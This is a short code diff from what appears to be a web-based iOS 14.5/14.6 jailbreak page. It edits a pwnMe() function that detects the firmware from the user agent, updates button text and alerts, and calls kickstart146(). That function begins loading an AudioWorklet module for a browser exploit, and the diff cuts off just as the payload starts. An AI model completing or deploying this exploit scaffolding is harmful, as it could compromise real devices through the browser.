@@ -22,15 +22,13 @@ async function pwnMe() {
         document.getElementById("jbButton").innerHTML = "Jailbreaking...";
         alert("AudioWorklet exploit for iOS 14.5 has been executed!");
   		} else if (currentFirmware(navigator.userAgent).startsWith("14.6")) {
-        //document.getElementById("jbButton").innerHTML = "Jailbreaking...";
+        document.getElementById("jbButton").innerHTML = "Jailbreaking...";
         alert("AudioWorklet exploit for iOS 14.6 has been executed!");
         kickstart146();
 			} else {
-				document.getElementById("jbButton").innerHTML = "Unsupported: iOS " + currentFirmware(navigator.userAgent);
         alert("Uh-oh!\n\niOS " + currentFirmware(navigator.userAgent) + " is not supported.\n\nPlease use an iOS 14.5 or 14.6 device.");
 			}
 		} else {
-  		document.getElementById("jbButton").innerHTML = "Unsupported: Desktop Environment";
       alert("Uh-oh!\n\nYou are on a desktop environment, which is not supported.\n\nUse this on a compatible iOS device.");
 		}
   }
@@ -38,7 +36,6 @@ async function pwnMe() {
 
 var keep = [];
 function kickstart146() {
-  document.getElementById("jbButton").innerHTML = "Exploiting...";
   var context = new OfflineAudioContext(1, 128, 300000);
   context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
     // constant added to double JSValues
